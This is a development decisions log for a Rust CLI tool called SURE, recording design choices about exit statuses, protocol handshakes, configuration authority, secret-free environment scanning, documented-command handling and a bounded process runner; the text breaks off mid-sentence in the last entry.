# Implementation decisions discovered during development

Use this for concrete decisions made while implementing the frozen product specification.

For architectural decisions with lasting impact, also add an ADR under `docs/adr/`.

## P1-T009 — `sure doctor`

- **The report is a value, not a verb.** `sure_core::doctor` returns a
  `DoctorReport`; nothing there formats anything. The examination happens in
  `Command::report`, one level in from `main`, so that a test can build a report
  and a renderer can read one without either going and looking at a machine.
- **A doctor that found a problem exits 1, not 0.** The false-green rule applied
  to SURE's own installation: `sure doctor || fix it` has to work. The status
  answers "is the answer clean", which is a different question from "did SURE
  run", and only the first is news.
- **`outcome` and `exit_code` are one predicate, twice.** They cannot disagree,
  because both read `DoctorReport::is_well`. They exist separately because one is
  read from a script's body and one from its status.
- **`exit_code` is now in every frame.** It was first written only for a
  refusal, on the idea that a field should appear when it says something. The
  status is a fact about every run, and a frame where it is sometimes absent is a
  frame a script has to special-case.
- **`sure doctor` never reads the settings file.** It reports the path and
  whether something is there. `DIAGNOSTICS.md` requires that a secret never have
  to be handled in order to be reported, and the report has no field that could
  hold one, so this is structural rather than a promise in a comment. Enforced
  by a source scan in `crates/sure-core/tests/doctor.rs`.
- **`sure doctor` never creates the store.** `Store::open_at` creates the file,
  so the existence check comes first. A diagnostic that changes what it is
  diagnosing is worse than one that says it did not look.
- **A store that is there and unreadable is a problem; a store that is not there
  is not.** A fresh installation has nothing recorded, and calling that a fault
  teaches the user to ignore the command on the day it has something to say. The
  problem text says what was found and leaves the repair to the user — the
  damaged file is not deleted or rebuilt.
- **`NotLookedFor` is not `NotCreated`.** When `Paths::discover()` fails there is
  nowhere to look, and reporting that as "nothing is recorded" invents an answer
  from a failure to find one.
- **One external program: `git`.** SQLite is compiled in, and everything else
  SURE will invoke (a project's `npm test`, a container runtime) is discovered
  per project by the execution layer, which is P15-T001's. `git` is named by
  `RUST_DESIGN.md` as the one external program the architecture calls.
- **The search is for what `Command::new` would run, not what a shell would
  find.** `name.exe` on Windows, name plus the execute bit elsewhere; no
  `.cmd`/`.bat`, because `RUST_DESIGN.md` forbids building a shell command line
  out of project-controlled text. An empty `PATH` entry is skipped everywhere, so
  the answer cannot depend on where SURE was started.
- **The version in a report is the number, not the string.** `Build.version`
  first held `version_string()` and the human form read `SURE SURE
  0.0.0-bootstrap`. `sure_domain::VERSION` is now the one spelling of the
  number, and `version_string()` is the name plus it.
- **The column the values start in is fixed, and the gap is a real space.**
  Padding the label to the full column width let the longest label touch its
  value — `evidence and historyC:\Users\…` — so the label is padded to one less
  and a space follows. A test asserts it for every label the renderer prints,
  rather than for whichever row a scan happens to reach.

## P1-T008 — the CLI framework

- **A command this build cannot run exits 3, never 0.** The false-green rule
  applied to the program itself: `sure check` in a CI script today has to fail
  the build, not pass it. `docs/architecture/CLI.md` §Exit statuses.
- **The refusal does not name a phase.** It was written, then removed: no test
  can check that a phase lands, and `sure history` has no owning task in
  `tasks/tasks.json`, so the field would have been invented for at least one
  command. A field whose value is sometimes made up is worse than no field.
- **The machine-readable frame is not an eighth document.** `PROTOCOL.md` said
  everything SURE writes is one of seven; it now says *about a project or an
  event*, and names the two containers — the stored record and the CLI response
  — that carry one. The frame lives in `sure-cli`, not `sure-protocol`, because
  it has one consumer (the reasoning ADR 0012 used to turn down `tracing`).
- **`--format` rather than `--json`.** One way to ask for a thing. Two spellings
  of one switch is two things that can disagree about which won.
- **Only `output.rs` names a process stream**, and a source scan in
  `tests/cli_contract.rs` enforces it. What is being ruled out is an absence,
  and no run of the binary can demonstrate that a line was never written.
- **`hook ingest` runs nothing on standard input.** A command that drained the
  event and then refused would have destroyed the evidence it was refusing to
  record, and the launcher would have no way to tell. The test writes a
  megabyte into the pipe and requires it to fail with a broken pipe.
- **Only `version` and `protocol` are implemented.** Both answer questions
  about SURE rather than about a project, which is why they need no engine.
  Adding a third is a change to a named test, not a side effect.
  *(`P1-T009` added `doctor` as the third, and that named test —
  `the_commands_this_build_implements_are_exactly_these_three` — is where the
  change was made.)*
- **`clap` 4.6.6** is the first dependency of `sure-cli`. `RUST_DESIGN.md` names
  it; `CLI.md` §Why clap records what it decides (the command line) and what it
  does not (output and status, both of which are SURE's and both of which have
  exactly one home).
- **`clap::Parser::parse` is not used.** It exits the process, which would put
  one row of the documented status table in a library's hands. `try_parse` plus
  `status_of` keeps the whole table in `crates/sure-cli/src/report.rs`.

## P1-T010 — the protocol version handshake

- **One function, not two comparisons.** `sure_protocol::handshake::negotiate`
  is the whole version rule, and `EventEnvelope::from_json` calls it rather than
  comparing numbers itself. Written separately they would drift, and the drift
  would be invisible: the CLI would tell an adapter "yes" and the reader would
  refuse its first event, which looks like a broken adapter and sends somebody
  looking in the wrong place. A test in `event.rs` drives both over
  `0..=PROTOCOL_VERSION + 3` and requires the same answer.
- **The rule is exact equality, and there is no compatibility table.** A version
  changes exactly when an older reader would get the format wrong, so a mismatch
  means a document that would be misread — and a misread event becomes wrong
  evidence about a project. A table of "older versions this build still reads"
  with one row would be a policy invented to look thorough; when a second
  version exists the list arrives with it.
- **A refusal is status 3, not 4.** 4 is reserved for a decision grounded in the
  user's configuration, and no setting makes this build speak a protocol it was
  not compiled with. 3 is documented as "this build cannot carry it out", and in
  the newer-caller direction the remedy is literally a newer build.
- **The mismatch says which side has to move.** The two directions are not the
  same answer, and a caller that has just been refused will otherwise try the
  fix that cannot work first. `Handshake`'s `Display` is the only copy of that
  sentence.
- **The frame carries structure, not the sentence.** `sure_speaks`,
  `caller_speaks`, `agreed` and `update` (`"sure"` / `"caller"`). A script that
  read prose would break the first time the prose was improved, and the prose
  here is written to be read by a person.
- **`caller_speaks` is `None` when the two agreed**, not the agreed number. The
  agreed number is this build's, and reporting it twice under two names invites
  a reader to treat them as two facts.
- **An agreed handshake is an answer; a refused one is a complaint.** So the
  agreed sentence goes to stdout and the refusal to stderr, by the same
  `Report::is_an_answer` predicate that decides every other command's stream.
  The machine form goes to stdout either way, because a script asked for it.
- **The rule lives in `sure-protocol` and reaches the CLI through `sure-core`.**
  `sure-cli` has exactly one edge into the engine (ADR 0001, and the note in its
  manifest), so a new protocol type is re-exported rather than added as a
  dependency. `sure_core::negotiate` is the same function, not a copy.
- **`protocol` grew a flag rather than gaining a second command.** `--speaks` is
  what turns a statement into a negotiation; asking for neither is still just
  the version, and a test keeps it that way.
- **The version is checked before the shape.** `from_json` already did this, and
  the order is now enforced through `negotiate` rather than by a comparison that
  happened to sit above the schema check. A newer document is reported as a
  version mismatch, not as a broken adapter.
- **The CLI test reads the version out of the frame** instead of carrying its
  own copy. A hard-coded number would keep passing after what SURE announces and
  what it accepts had drifted apart, which is the failure it exists to catch.
- **A word where a version belongs is a wrong command line (2),** not a refusal
  (3). `--speaks latest` reads as a version that exists and is refused; that is
  the wrong thing to tell an adapter.

## P1-T011 — configuration authority

Task: `Implement configuration authority layers`. Acceptance: "Project config
cannot silently grant host execution/network/install/full-recording or weaken
user protection. Authority resolution has unit tests."

The rule is one sentence in `docs/architecture/CONFIG_AUTHORITY.md`, and
`crates/sure-core/src/config/authority.rs` is that sentence as code:

> A layer cannot widen what a layer above it allows, and cannot weaken a
> restriction a layer above it imposed.

- **`Layer` is `User` and `Project`, and nothing else.** Rank 3 in the authority
  order is organization policy, which does not exist in this release. It is not a
  variant, so no caller can name a source it can never obtain. Rank 1 — the
  person at the keyboard — is not configuration at all and stays where it already
  was, in `ConsentGrantor::InteractiveUser`.
- **`Layer::can_grant()` is a match, not `self == Self::User`.** Written as a
  match so that adding a third layer forces the question to be answered instead
  of silently inheriting "no". It is the whole document in one predicate.
- **`Authority::privileges()` records every ask, including the refused ones.** A
  `Privilege` carries the request, every layer that asked (most trusted first),
  and the grantor or `None`. A project file that asks for the network produces a
  recorded refusal — not a granted permission, and not silence. Dropping refusals
  would make "asked and refused" and "never asked" the same list, which is the
  shape of report this product exists to replace.
- **A grant comes only from the topmost layer that asked, and only if that layer
  may grant.** A request appears in `asked_by` together with every layer above it
  that also asked, so the first entry is the strongest. A project and its user
  both asking is the ordinary case and is *not* reported as an escalation.
- **`permissions()` is not `decide()`.** It says which permissions a *file* was
  allowed to hand over. Whether an action may run is
  `sure_domain::execution::decide`, which needs a mode and treats an
  unclassifiable command as needing its own consent in every mode. Two different
  questions; conflating them is how a blanket configuration grant becomes a
  blanket execution grant.
- **The execution mode is not a permission.** A project asking for
  `host_confirmed` gets no entry in the permission set. The mode is the project's
  preference about what SURE would do with permissions it does not have.
- **Restrictions resolve to the stricter value, and `Resolved::by` names the
  most trusted layer that asked for it.** A project may ask for *more*
  protection and is named as the reason; it may not ask for less. `fully_local`
  beats `local_first` whichever layer wrote it, because sending less out is never
  the escalation.
- **The ranks are two hand-written `match`es, not a derived `Ord`.** The
  declaration order in `values.rs` is the order a user reads the values in, which
  happens to agree today and has no reason to keep agreeing. The two unavailable
  variants are ranked in the safe direction — `Custom` protection highest,
  `cloud_enhanced` privacy lowest — so an input SURE cannot reach can never be
  the reason a stricter setting is dropped.
- **`by: None` means "nothing beyond the default", not "SURE did not work it
  out".** A report that could not tell those apart would be unable to say whether
  it had looked.
- **No merged `Config`, as ADR 0011 requires.** There is no `effective()`. Scope
  reductions are read from the project and *reported* rather than overridden: a
  project that sets a check to the default is indistinguishable from one that
  never mentioned it, so "your file overrode the project" would be a claim SURE
  cannot support.
- **`Config::load` split into `load` and `load_file`.** The user's configuration
  is the same format at a different path, so it is read by the same reader rather
  than by a second one that would drift. The near-miss `sure.yml` check follows
  the *file name*, not the directory: `sure.yml` is only a mistake as a spelling
  of `sure.yaml`, and a caller that asked for `config.yaml` has not misspelled
  anything. That is now a contract of a public function, so it has its own test.
- **`Layer::User` names `ConsentGrantor::UserConfiguration`, not
  `InteractiveUser`.** A configuration file grants a class of actions; the person
  at the keyboard approves one action and names the exact argument vector. The
  two are different objects and are not folded into one flag.

Not in this task, and said plainly in the architecture document: **nothing routes
through the authority layer yet.** No command builds an `Authority`; wiring it in
front of the check pipeline is P13-T009, which depends on this. Until then the
resolution is built and tested on its own.

## P2-T012 — support-level classification

**Phase `P2`'s other tasks recorded their decisions in `progress/HANDOFF.md`
rather than here; this entry starts making the file current again, and it is
worth carrying forward.** The decisions in it are the ones a later reader would
otherwise have to reverse-engineer from the code.

- **The level is derived, not assigned.** Nothing sets `Project::support`; the
  only rule that fills it is `sure_core::support::classify`, which takes a
  `Discovery` rather than a path so it cannot disagree with the scan it came from
  about what was in the project. A field a caller could write directly would let
  a report claim a level no scan supports.
- **The level is the weakest of what SURE read and what SURE can do**, and the
  reason names both. Neither half alone is the answer: reading alone would make a
  perfectly-read manifest level A, and capability alone would make a directory
  with no manifest level A too.
- **`SupportLevel` declares its variants best first, so the weakest is
  `Ord::max`.** Nothing in the declaration says which end is strong, so the
  ordering is written on the type and held by
  `support::tests::the_order_of_the_levels_is_by_strength`. `weakest` is a `max`
  fold: swapping it to `min` is a one-word change that would promote every project
  to the strongest thing found in it.
- **`CEILING` is a constant, and the reason for its value is an evidence claim.**
  Levels A and B both require *running* checks and this build runs no project
  code — checkable, because the only `Command::new` in product code is the
  read-only `git` in `fingerprint/git/mod.rs`. So every project is level C, and
  the *reason* says so rather than the level alone, because a project with a
  readable manifest is graded `generic` by discovery and a reader who is not told
  why would take that for the answer.
- **`ProjectSupport::unrecorded()` returns a real level, the weakest one, and
  `is_recorded()` is the only door to the difference.** A caller reading only
  `level` cannot tell "nobody classified this" from "this is level C". The
  alternative — an `Option` — was not taken because `unrecorded` is itself a
  defensible answer to show a user, and because a stored record that predates the
  field must read as unclassified rather than fail to load; `#[serde(default)]`
  plus a real default gives both.
- **A stored record with no `support` field reads as unclassified, not as a
  claim**, held by a wire-contract test that removes the field from a real
  serialized record.

**Left open for the owner, not settled here:** whether a project's level states
what SURE *can do* (this implementation: every project is level C) or what SURE
*understands* (which would set `CEILING = Generic` and make a readable manifest
level B). Both readings are defensible, `ECOSYSTEM_DISCOVERY.md` already uses the
second for its own `grade`, and the change either way is two lines plus the tests
that pin today's answer. The argument for the first is that
`plain_description(Generic)` renders *"SURE can find how this project is built
and run"* and SURE cannot run it.

## P2-T008 — environment and configuration references

The decisions in it are the ones a later reader would otherwise have to
reverse-engineer from the code. The first is the acceptance itself.

- **The value rule is enforced by the shape of the types, not by a check.**
  `SECRET_REDACTION.md` asks SURE to avoid logging raw environment values, so no
  field on `Reference` or `Declaration` can hold one, and `key_from_env_line`
  takes a single `&str` and returns an owned `String` key with nowhere for the
  right-hand side to go. A redaction step would have been easier to write and
  would have failed open; a shape fails closed. The corollary is that the module
  must never *need* the value: it does not decide whether a key is a secret, and
  a key named `AWS_SECRET_ACCESS_KEY` is the finding rather than something to
  redact.
- **`.env` is not read, and it is not reported as unread either.** Not reading
  the file the values are in is a decision, so it is not a loss, so
  `is_complete()` stays true for a project SURE deliberately skipped. Reporting
  those files in `unread()` would tell a caller the pass was incomplete when
  nothing was lost — the same "do not render a decision as an absence" rule that
  `components::Members::NotRead` exists to hold.
- **A key SURE assembled is not a key the project stated.** `process.env[prefix +
  "_URL"]` is not a read, and neither is `process.env["API_"+SUFFIX]`. The
  second is the one worth naming: with a space, the space alone rejects it, so
  only the unspaced spelling exercises the rule, and it was the mutation that
  found the untested case.
- **The two one-sided statuses describe the two lists, not the project.**
  `ReadButNotDeclared` says SURE read a key and found no declaration for it; it
  does not say the project is missing anything, because a project can set an
  environment variable in a deployment system SURE did not read. Same reason as
  `Members::NotRead`, and it is a wording decision with a test on it
  (`the_two_one_sided_statuses_do_not_claim_the_project_has_nothing`).
- **The module reads what the scan found and nothing else.** It takes a
  `&Discovery` and opens only paths the `Scan` listed, so "can a project make
  SURE read a file outside itself?" is answered by `scan::Walk` rather than here —
  and `scan::Walk` answers it by never yielding a link as an entry
  (`scan/mod.rs:490-498`). That is why no `symlink_metadata` guard was added to
  this module's reader: it would be unreachable code that no test can exercise,
  and it would imply the sibling readers that lack it are unsafe. The residual
  TOCTOU window is gap 6 and is shared with `discover/read.rs`.
- **`found.sort()` in `candidates` is kept although it currently changes
  nothing**, and the mutation that removes it is declared unobservable **with the
  reason and the condition that would falsify it**. `Scan::files` already yields
  component-lexicographic order because the walker sorts siblings by name and
  recurses inline. The sort is what keeps this module's read order — and so which
  file runs out of budget — from depending on a traversal order this module does
  not own.

## P2-T009 — documented commands

The acceptance is one sentence with two halves, and the second half is about
something that did not happen, which is the kind of claim that is easy to write
and hard to hold. The decisions below are the ones a later reader would otherwise
have to reverse-engineer from the code.

- **"Never auto-executed" is a property of the shape rather than a promise, and
  the module says so in as many words.** No field on `DocumentedCommand` can hold
  a program and its arguments — `text` is one string, and nothing in `sure-core`
  ever splits it; `DocumentReport::of` is the only door a report can come through;
  the provenance is *derived* from `Config::goal_source()` rather than restated,
  so there is still one decision point; and `sure-cli` builds no `DocumentReport`
  at all. The module comment declines the stronger claim: *there is no function
  anywhere that turns a `DocumentedCommand` into an `ApprovedCommand`, so today
  the path does not exist rather than being blocked.* A blocked path is a
  promise; a missing one is a fact about the code.
- **The half of the acceptance that is about what did not happen is held by
  three assertions and a control.** `the_documented_command_left_no_trace_and_the_document_was_read`
  asserts the command was found, that the document was read, **and** that a
  recursive snapshot of the project is byte-identical before and after.
  `the_helper_that_looks_for_new_files_can_see_a_new_file` exists because a
  snapshot helper that never notices anything would satisfy the first test
  perfectly — the false green in miniature, and the same reason the mutation
  harness runs its baseline unmutated. The fixture's command is
  `npm install && echo SURE-RAN-THIS > SURE-RAN-THIS.txt`, so the evidence of a
  leak is a file whose absence is checkable rather than an inference.
- **A `DocumentedCommand` *is* the claim, so there is one list here and not
  two.** The module doc argues it: a fenced block carrying a language is the only
  claim a document makes that SURE can read off by rule, and pulling requirements
  out of a sentence would be the T17 hallucination. `lying-readme`'s description
  ("README setup command does not work on fixture") and `P4-T005`'s acceptance
  (claims/paths/scripts) both read it that way. Written down because it is a
  decision and not an omission.
- **Indentation is ignored when looking for a fence — the one deliberate
  CommonMark departure.** A fence inside a list item is indented by the marker
  width, so following the spec exactly reports *no commands* and a complete
  reading: a silent loss dressed as a clean result, which `CLAUDE.md`'s ordering
  puts below a visible error. `unindent` (at most three spaces) is kept for
  headings, and the asymmetry is deliberate — a heading read wrongly costs a
  section label, a fence read wrongly costs every command inside it.
- **An untagged fence is a gap; a fence in another language is a decision.**
  `FenceLanguage::Unstated` becomes `UnreadReason::UntaggedFence` and turns
  `is_complete()` false; `FenceLanguage::Other` yields nothing and is not a loss.
  There is no arm in `UnreadReason` for a block whose tag is known and is not a
  shell, and its absence is the type saying so.
- **The two budgets stop when they are already spent, and they mean the same
  thing here as in `references.rs`.** `OutOfBytes` says *"the pass had already
  read as many bytes as it will in one run"* and `OutOfBudget` the same for
  documents, matching the accepted `references.rs` predicate, field names and
  sentence. A pass therefore overshoots by at most one document. **The
  alternative — refusing a document whose size would take the total over — is a
  real reading of "budget", and it is the one this module's first test encoded,
  which made that test impossible to pass.** The pre-flight baseline check in the
  mutation harness is what caught it, and the fix went to the test rather than
  the code, because `references.rs` is accepted with the already-spent reading
  pinned by `the_byte_budget_stops_the_pass_before_the_file_budget_does`. Two
  passes that both say "had already read" must not come to mean two things.
- **Which files are documents is one function, asked from two places.**
  `references.rs::declaration_candidate` now calls
  `documents::is_document` rather than repeating the two name shapes, so the day
  one of them learns about `.markdown` the other follows. The harness carries a
  mutation that removes the shared call's `Document` arm, because the change has
  to be visible from both sides.
- **`commands.sort_by` is kept although it currently changes nothing**, and the
  mutation that removes it is declared unobservable **with the reason and the
  condition that would falsify it** — the same shape as `found.sort()` in
  `P2-T008`, and for the same reason: the order is a guarantee this module does
  not own, and the sort is what stops the report's order from depending on a
  traversal it does not own.
- **The reading machinery is self-contained rather than shared with
  `references.rs`, and that is a cost rather than a benefit.** Both passes have a
  `Reader`, an options struct and an unread reason; extracting one would have
  meant editing accepted code that `mutate14.py`'s anchors sit on, and the two
  passes have genuinely different budgets and different gap kinds. Recorded as a
  deliberate duplication so a later reader can decide to pay for the extraction
  rather than discover the duplication.
- **`command_from` has no check that a command's text is non-empty, and there
  was one until the mutation run found it.** The guard read as a safety net and
  could never fire: `trimmed` comes from `raw.trim()`, so a line that is only `$`
  has already lost the space before `strip_prefix("$ ")` is asked, and every line
  that does match keeps a non-whitespace character after the space or `trim`
  would have removed it. The test written to pin that guard
  (`a_prompt_with_nothing_after_it_is_not_a_command`) passed for a different
  reason than its name said — the failure mode `CLAUDE.md` ranks below a visible
  error, and one the harness found by deletion rather than by inspection. The
  guard was **removed rather than declared unobservable**, following `P2-T008`'s
  precedent for the `symlink_metadata` guard that was not added for the same
  reason: an unreachable guard implies protection that is not there. The
  invariant moved to a comment stating why it holds and to the test that fails
  if the `trim` is ever weakened, and the mutation that aimed at the guard now
  aims at the `trim` instead.
- **Nothing in the product reads a `DocumentReport` yet.** `sure-cli` builds
  none, so this is a produced-and-read-by-nothing module in the same family as
  `ComponentGraph`, recorded rather than presented as wired up.

## P2-T011 — intent sources

The acceptance is two sentences: *"Intent sources preserve provenance/trust
labels"* and *"Inferred intent cannot satisfy user requirements."* The first is a
claim about a label **surviving**, and a test can hold it wrongly by reading the
label off and agreeing with it — so every test that asserts a label here also
drives the statement through `may_claim_full_fulfilment`, which is the gate the
label is actually for.

- **The label belongs to the door, and no door takes one.** Every channel has a
  function that produces a `Requirement` and writes its own `IntentSource`. No
  function here that *produces* a `Requirement` takes a source as an argument, so
  a caller holding a command it read out of a README has nothing to ask for:
  there is no parameter to ask with. Provenance survives by a shape the module
  does not offer an alternative to, rather than by a rule its code follows. The
  one function that does take a source, `from_source`, goes the other way — it
  reads statements *back* by the label they arrived with — and the module doc
  names it rather than leaving a reader to find it and doubt the rule.
- **`observed_user_request` takes an `&Authority` and not a `&Config`, and the
  same bytes on disk give opposite answers.** `sure.yaml` lives inside the
  project, and the project is written by the same agent whose work is being
  judged, so `privacy.full_recording: true` there is a **request**.
  `Authority::privilege(ProjectRequest::FullRecording)` is asked whether anyone
  was able to grant it, and only the user's own settings outside the project can.
  The integration test holds this with one `sure.yaml`, byte for byte, refused
  first as an escalation and then granted — with a control asserting the kept
  request is worth exactly what a goal that was typed is worth, because the
  privacy decision is about whether the words are kept and not about how much
  they count.
- **Six rows in the module's table, five labels, and the two `project_spec` rows
  are one channel reached by two doors.** `documented_goal` and
  `DocumentReport::as_requirements` both ask `Config::goal_source()` rather than
  naming the label themselves, so `P2-T009`'s decision point is still the only
  one. The table lists doors and not producers, and the module doc says so: a
  table of five labels reads as a pipeline whether or not one exists, and three
  of these doors have nobody knocking.
- **`documented_goal` answers `None` for a goal with no words rather than an
  error.** `Config::from_yaml` refuses such a file before a `Config` can hold
  one, so the only caller that reaches this with one built it by hand.
  Manufacturing a requirement with no words in it would be the worse answer to a
  case the reader already refuses — and it would put a blank row in a history
  that reads as something somebody asked for.
- **`agent_claim` and `inferred` leave `raw_retained` false, and each door says
  why.** The flag is about *captured* material. The claim door does not know
  whether the caller kept the agent's sentence or restated it, and defaulting the
  flag to true on the caller's behalf would be the door claiming something it
  does not know; a caller that did quote it says so with
  `with_raw_retained(true)`. An inference has no original wording behind it at
  all, because the words are SURE's own. For the two doors that *do* set it — the
  project's goal and the kept request — the flag is a claim about the exact
  wording, which is why both are tested with input whose spacing `trim` would have
  changed: a door that tidied the words and still said `true` would be reporting
  something it did not do.
- **This module does not derive what a label is worth.** `RequirementAuthority`
  derives that from the label in the domain, in one place, and a second derivation
  here is how the two would come to disagree. Nor does it compare a statement
  against a project (`P6-T008`) or assemble a whole project's intent — one of the
  five channels is reached by reading a goal back out of the store, and
  `PROJECT_INTENT.md` records the `HistoryFilter` gap in the way of a reader
  asking for one project's goal.
- **`from_source` is one query over the closed vocabulary rather than an accessor
  per variant**, so a source added to the domain is one this can answer for on the
  day it is added rather than on the day somebody notices. `IntentSource::ALL` is
  generated from the vocabulary itself, which is what makes that true.
- **A test of my own made a claim it could not hold, and it was deleted rather
  than reworded.** `a_documented_goal_is_labelled_by_the_one_place_that_decides_it`
  compared the door's answer against `Config::goal_source()` and its comment said
  *"this is the assertion that fails on that day"* — but the mutation that writes
  the literal `IntentSource::ProjectSpec` instead of asking is **invisible** to
  that comparison, and **no test can move a `const`**. It would have passed for a
  different reason than its name said, which is the failure `P2-T009` punished in
  `command_from`'s unreachable guard. The claim is now declared unobservable in
  `target/tmp/mutate16.py` with the condition that would falsify it, and a
  distinctness test replaced it — asserting that the three channels' identifiers
  all differ, because a collision is what would make two statements one, and that
  *is* observable.
- **Three claims in the module's own comment could not hold, and they were found
  by reading it against the code before the harness ran.** It said *"no function
  in this module takes an `IntentSource` as an argument"*, which `from_source`
  does; it said *"one of the four channels"*, where `IntentSource::ALL` has five;
  and it said `P8-T005` *writes* `OBSERVED_REQUEST_ID`, in the present tense about
  a task that is `queued`. All three were fixed before the mutation run, so the
  run describes the committed revision.
- **`project_intent.spec_path` is validated and read by nothing, and this task
  deliberately declines to close it.** `Config::validate_intent` refuses a
  `spec_path` outside the project, and no code opens the file it names. Reading it
  is a change to what a *document* is — it belongs with the documents pass, and it
  carries a Windows deduplication risk, because a `spec_path` naming a file the
  walker also reaches would make one document arrive twice under two paths. It is
  recorded as a gap rather than implemented here: the acceptance does not ask for
  it, and a reader who found a second door into the same file would be right to
  ask which one owns the provenance.
- **The mutation harness's own evidence was wrong, and the first run of
  `P2-T011`'s harness is what exposed it.** `cargo test --quiet` passes `-q` to
  libtest, which prints one character per test: a failing test gets a `.` like
  every other, and the `test <name> ... FAILED` line **is never printed**. The
  filter both harnesses used — lines starting with `test ` and containing
  ` FAILED` — therefore collected the per-binary `test result: FAILED.` summaries
  and printed a binary count under a heading that read as a list of tests. **The
  verdicts `P2-T009` was accepted on are unaffected**: `CAUGHT` turned on that list
  being non-empty, and a summary line can only come from a harness that ran and
  failed. What was wrong was the evidence, not the conclusion — which is exactly
  the distinction this repository refuses to let anyone make quietly, so both
  harnesses now read the names out of libtest's `failures:` list, and both refuse
  to run at all if a mutation appears to be left applied. That last check exists
  because a killed run leaves one behind: `apply` restores the file in a
  `finally`, which covers an exception but not the process being stopped, and one
  was found on disk only because the anchors were re-checked by hand.

- **Four stale structures were found in `progress/HANDOFF.md` by this acceptance,
  and all four are the same shape: a list that is wrong in a way that reads as
  complete.** The "Accepted work on this branch" list was missing four accepted
  tasks — 23 entries where `progress/state.json` records 32 acceptances; the
  ordered list of this branch's commits stopped one commit short of the tip; the
  "Next concrete action" list carried two `3.`s, three `4.`s and two `5.`s over
  nine items, which had already rotted a cross-reference (*"the same shape as
  `ComponentGraph` in item 3"* was written about `P2-T007` and by then pointed at
  `P2-T008`); and the CI table was four commits short, so three accepted tasks had
  a prose section below and no row in the index. Each was found by checking the
  file against something **outside** it — `progress/state.json`, `git show
  --stat`, `gh run list --branch claude/v0.1-autonomous` — and not one by reading
  it, which is the only method that has ever found one. **They are repaired rather
  than recorded as gaps**, because a handoff is the artefact the next session
  trusts before it trusts the code, and a reader who counts 23 entries under a
  heading that says "accepted work on this branch" has no way to know the number
  is not the answer. The CI rows were read out of freshly downloaded logs rather
  than copied from the rows they follow, which is why all four acceptance runs
  come back *unchanged from the row above* as a measured result and not an
  expectation. The rule this leaves: **a list in the handoff is a claim, and the
  check for it is a set comparison against the file that owns the data.**

## P3-T001 — the bounded process runner

The acceptance is two sentences: *"Executable/args/cwd/env/timeout/cancel/output
limits are explicit"* and *"Direct args used instead of unsafe shell string
construction where possible."* The first is a claim about a **description**
having no unstated parts, so most of the tests hand a value back before anything
runs; the second is a claim about a shape, and source text is the only place a
shape can be checked.

- **The Windows shell claim this task was written against was wrong, and
  measuring it is what showed the difference.** The module was written saying a
  `.cmd` cannot be run at all, "because `CreateProcess` appends `.exe` and runs
  nothing else". Half of that is true, and the two halves are one extension
  apart. A name with **no** extension really is completed with `.exe` and nothing
  else: `npm` is *not found* on a machine where `npm.cmd` is on `PATH`, and a
  bare `build` does not reach the `build.cmd` sitting beside it — which is the
  rule that matters, because that is the shape a project directory has. But a
  `.cmd` or `.bat` named **with its extension** starts, and the image of the
  process that runs is `C:\Windows\System32\cmd.exe`: Windows starts a command
  interpreter for a batch file itself. Measured three ways on Windows 11 with
  Rust 1.98 — `CreateProcessW` called directly with the arguments
  `Command::new` passes it, `Command::output` from a standalone probe, and
  `sure_core::process::run` through the tests that now hold it — and the reading
  of the child's image is `QueryFullProcessImageName`. A `.ps1` is the case the
  old sentence was right about, for a different reason: it fails with os error
  193, "not a valid Win32 application", which is a different fact from "not
  found" and is worth keeping distinct.
- **Six shipped files carried a claim this task made false, and only prose was
  wrong in every one.** Four carried the batch-file claim — `process/mod.rs`,
  `process/request.rs`, `process/error.rs` and `doctor.rs` — and two more carried
  the *neighbouring* claim that `sure-core`'s shipped code has exactly **one**
  `Command::new`, which is now three: `documents.rs` and `support.rs`. Both were
  true when written and are the kind of sentence a new module quietly falsifies,
  which is why they were searched for rather than noticed. `doctor.rs`'s
  *behaviour* was
  already right — `EXECUTABLE_SUFFIXES = [".exe"]` is what a bare name really
  does, and its "a name that already carries an extension is used as given" is
  the other half of the same truth. What was wrong there was the reason given for
  a right answer, which is the kind of error that survives longest: the sentence
  "a `.cmd` is not something SURE can run" is false, and a reader who checked it
  would have found the whole paragraph untrustworthy rather than the one clause.
  The corrected sentence is narrower and is the one the product can stand behind
  — **SURE builds no command line, and Windows supplies an interpreter anyway
  when the program it is handed is a batch file.**
- **Whether a caller may name a batch file is left open on purpose.** Running one
  is running project-controlled shell text: that is `P3-T004`'s classification
  and `P3-T005`'s permission question, with `P3-T007` enforcing the answer in
  `inspect_only` mode. A mechanism that quietly refused `.cmd` would be making
  policy inside the machinery, and one that quietly allowed it while the
  documentation said "no shell" would be the false green this repository treats
  as the worst outcome there is. Three tests hold the facts and are mutually
  controlling, each in its own scratch directory and each asserting the **same
  marker** the others do: one runs a `.cmd` by absolute path and requires the
  marker to appear, one names a `build<pid>.cmd` by its **stem** and requires
  `NotStarted` *and* no marker, one names a `.ps1` and requires the same. So a
  runner that ran everything fails the refusals and a runner that refused
  everything fails the run — and the bare-name one is written so that "the
  current directory was not searched" is not an explanation for its pass, since
  it runs in the directory the file is in and the name carries a process id no
  copy of the file shares. They are `#[cfg(windows)]`, which
  makes the Windows test count three higher than macOS and Ubuntu permanently;
  that is a platform fact and not a discrepancy.
- **"No product path calls `run` yet" is a test rather than a paragraph.**
  `tests/spawn_sites.rs` holds two rules over the shipped sources: every file in
  `crates/` whose **code** builds a `Command` is named in a list with a reason,
  and nothing outside `crates/sure-core/src/process/` names `ProcessRequest`. The
  second is the load-bearing one, because `run` takes a `&ProcessRequest` and
  there is no other entry point, so a file that cannot name the type cannot be a
  caller — a stronger statement than searching for `process::run`, which a `use`,
  an alias or a re-export would walk straight past. The rule is *meant* to fail
  the day `P3-T004`, `P3-T005`, or `P3-T007` wires the runner up, and the file
  says so, because `sure_core::support`'s level-C ceiling is justified by no
  project code running: the caller and the ceiling have to move in the same
  commit. Both rules were proved non-vacuous by hand before the harness ran, with
  the proving edits reverted in a `finally`.
- **The one source-level guard this would have broken was found by the harness,
  not by reading.** `fingerprint_git.rs`'s `git_is_started_in_exactly_one_place`
  forbids `Command::new` on a program held in a variable anywhere outside
  `fingerprint/git/mod.rs`, and the runner's `command()` is exactly that — so the
  first harness run stopped at `BASELINE IS NOT GREEN` with that test failing,
  which is the baseline check doing the job it exists for. The guard was
  **narrowed rather than weakened**: `process/request.rs` is exempted *by name*,
  with the reason written next to the exemption (the runner holds any program a
  caller names and is not a Git entry point), while `Command::new("git")` stays
  forbidden there and everywhere else. An earlier task had already written this
  rule down in the only form that could catch this, which is the argument for
  writing such rules at all.
- **A test was added because a mutation could not otherwise be caught.**
  `discarded_bytes() > 1` was among the mutations and nothing observed it: the
